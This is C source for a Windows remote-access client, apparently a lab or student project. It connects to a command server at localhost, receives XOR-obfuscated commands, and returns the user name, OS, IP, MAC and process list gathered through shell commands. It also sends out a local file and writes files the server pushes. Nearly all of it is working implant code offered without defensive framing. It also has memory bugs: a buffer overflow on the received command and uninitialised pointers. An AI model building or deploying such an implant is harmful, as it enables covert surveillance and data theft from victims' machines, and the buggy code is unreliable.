#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")
#include <string.h>

// Saves output for commands from the server
char *get_output(int num){
    char buf[2000];
    char *str = NULL;
    char *temp = NULL;
    unsigned int size = 1;  // start with size of 1 to make room for null terminator
    unsigned int strlength;
    FILE *ls;

    // getUser command from server
    if(num == 1) {
        if (NULL == (ls = popen("whoami", "r"))) {
            perror("popen");
            exit(EXIT_FAILURE);
        }
    }
    // getOS command from server
    else if(num == 2){
        if(NULL == (ls = popen("systeminfo | findstr /i /c:'OS Name'", "r"))){
            perror("popen");
            exit(EXIT_FAILURE);
        }
    }
    // getIP command from server
    else if(num == 3){
        if(NULL == (ls = popen("ipconfig | findstr /i 'ipv4'", "r"))){
            perror("popen");
            exit(EXIT_FAILURE);
        }
    }
    // getMAC command from server
    else if(num == 4){
        if(NULL == (ls = popen("ipconfig /all | findstr /i 'Physical'", "r"))){
            perror("popen");
            exit(EXIT_FAILURE);
        }
    }
    // getProc command from server
    else if(num == 5){
        if(NULL == (ls = popen("wmic process get Description", "r"))){
            perror("popen");
            exit(EXIT_FAILURE);
        }
    }
    // Read one line at a time from the output and save it to a string
    while (fgets(buf, sizeof(buf), ls) != NULL) {
        strlength = strlen(buf);
        // Allocating room for the buffer
        temp = realloc(str, size + strlength);
        if (temp == NULL) {
            // allocation error
        } else {
            str = temp;
        }
        // Appending buffer to the output string
        strcpy(str + size - 1, buf);
        size += strlength;
    }
    pclose(ls);
    return(str);
}


// Performing XOR encryption and decryption
// Key byte is 0x7A
char* xor(char *data){
    int i;
    for(i = 0; i < strlen(data); i++){
        data[i] ^= 0x7A;
    }
    return data;
}

int main(){

    WSADATA wsa;
    SOCKET  s, out_socket;
    struct sockaddr_in server;
    int command_size;
    char command[20];
    int command_num;
    char *encrypt_username;
    char *encrypt_OS;
    char *encrypt_IP;
    char *encrypt_MAC;
    char *encrypt_Proc;
    FILE *file_pointer;
    char *filedata;
    long lSize;
    size_t download_res;
    char file_name[12];
    int file_data_size;
    char *username;
    char *OS;
    char *IP;
    char *MAC;
    char *Proc;
    char proc_message[35];
    char *encrpyted_file_data;



    // Initializing socket
    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0)
    {
        printf("Socket startup failed with error: %d", WSAGetLastError());
        return 1;
    }

    // Creating socket
    if((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("Socket could not be created: %d", WSAGetLastError());
    }

    // Server structure
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_port = htons(12345);

    // Connecting to server
    out_socket = connect(s, (struct sockaddr *) &server, sizeof(server));
    if(out_socket < 0)
    {
        printf("Connect error\n");
        return 1;
    }
    printf("Connected to server\n");

    // Receiving commands from server
    while(1){

        command_size = recv(s, command, 40, 0);
        command[command_size] = '\0';
        // Decrypting the command from the server
        strcpy(command, xor(command));

        // getUser command from server
        if(!strcmp(command, "getUser"))
        {
            username = (char *) malloc(20);
            encrypt_username = (char *) malloc(20);
            command_num = 1;
            // Command output into username string
            strcpy(username, get_output(command_num));
            // Placing encrypted username into encrypt_username
            strcpy(encrypt_username, xor(username));
            send(s, encrypt_username, strlen(encrypt_username), 0);
            free(encrypt_username);
            free(username);
        }
        // getOS command from server
        else if(!strcmp(command, "getOS")){
            OS = (char *) malloc(60);
            encrypt_OS = (char *) malloc(60);
            command_num = 2;
            // Command output into OS string
            strcpy(OS, get_output(command_num));
            // Placing encrypted OS into encrypt_OS
            strcpy(encrypt_OS, xor(OS));
            send(s, encrypt_OS, strlen(encrypt_OS), 0);
            free(encrypt_OS);
            free(OS);

        }
        // getIP command from server
        else if(!strcmp(command, "getIP")){
            IP = (char *) malloc(600);
            encrypt_IP = (char *) malloc(600);
            command_num = 3;
            // Command output into IP string
            strcpy(IP, get_output(command_num));
            // Placing encrypted IP information into encrypt_IP
            strcpy(encrypt_IP, xor(IP));
            send(s, encrypt_IP, strlen(encrypt_IP), 0);
            free(encrypt_IP);
            free(IP);
        }
        // getMAC command from server
        else if(!strcmp(command, "getMAC")){
            MAC = (char *) malloc(600);
            encrypt_MAC = (char *) malloc(600);
            command_num = 4;
            // Command output into MAC string
            strcpy(MAC, get_output(command_num));
            // Placing encrypted MAC information into encrypt_MAC
            strcpy(encrypt_MAC, xor(MAC));
            send(s, encrypt_MAC, strlen(encrypt_MAC), 0);
            free(encrypt_MAC);
            free(MAC);
        }
        //getProc command from server
        else if(!strcmp(command, "getProc")){
            Proc = (char *) malloc(20000);
            // Process confirmation message
            strcpy(proc_message, "Processes listed on client");
            command_num = 5;
            // Command output into Proc string
            strcpy(Proc, get_output(command_num));
            // Listing the running processes
            printf(Proc);
            // Sending process confirmation message to the server
            strcpy(proc_message, xor(proc_message));
            send(s, proc_message, strlen(proc_message), 0);
            free(encrypt_Proc);
            free(Proc);
        }
        // download command from server
        else if(!strcmp(command, "download")){
            // Getting pointer to downloaded file
            file_pointer = fopen("download.txt", "rb");
            fseek(file_pointer, 0, SEEK_END);
            lSize = ftell(file_pointer);
            rewind(file_pointer);
            filedata = (char *) malloc(lSize + 1);
            // Reading the file into filedata
            fread(filedata, lSize, 1, file_pointer);
            fclose(file_pointer);
            filedata[lSize] = '\0';
            // Encrypting file data and sending it to the server
            strcpy(encrpyted_file_data, xor(filedata));
            send(s, encrpyted_file_data, strlen(encrpyted_file_data), 0);
            free(filedata);
        }
        // upload command from server
        else if(!strcmp(command, "upload")){
            // Receive file data from the server
            file_data_size = recv(s, filedata, 1000, 0);
            filedata[file_data_size] = '\0';
            // Decrypting the file data
            strcpy(filedata, xor(filedata));
            strcpy(file_name, "upload.txt");
            // Create the file and write the file data to it
           file_pointer = fopen(file_name, "wb");
           if(file_pointer == NULL){
               perror("ERROR");
           }
           fwrite(filedata, strlen(filedata), 1, file_pointer);
           fclose(file_pointer);
        }
        else{
            closesocket(s);
            WSACleanup();
            break;
        }
        memset(command, 0, strlen(command));

    }

}
